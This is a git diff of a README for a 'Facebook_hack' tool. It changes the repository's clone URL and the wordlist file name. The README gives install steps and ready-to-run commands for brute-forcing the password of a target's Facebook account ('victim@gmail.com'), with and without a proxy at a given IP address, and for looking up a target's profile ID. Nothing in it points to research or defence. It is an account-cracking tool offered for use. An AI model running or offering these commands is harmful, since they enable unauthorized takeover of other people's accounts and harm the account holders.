@@ -30,7 +30,7 @@ apt update && apt upgrade -y
 apt install git -y
 ```
 ```bash
-git clone https://github.com/hackerxphantom/Facebook_hack.git
+git clone https://github.com/idealzora211-tech/Facebook_hack.git
 ```
 ```bash
 cd Facebook_hack
@@ -47,11 +47,11 @@ python facebook_hack.py
   
   - **Brute Force On Facebook Account Without proxy**:
   
-  * **Command**: python facebook_hack.py -t victim@gmail.com -w 10MPASS.txt
+  * **Command**: python facebook_hack.py -t victim@gmail.com -w wordlist.txt
   
   - **Brute Force On Facebook Account With Proxy**:
    
-    * **Command**: python facebook_hack.py -t victim@gmail.com -w 10MPASS.txt -p 144.217.101.245:3129
+    * **Command**: python facebook_hack.py -t victim@gmail.com -w wordlist.txt -p 144.217.101.245:3129
     
     - **Get Target Facebook Profile ID**:
   
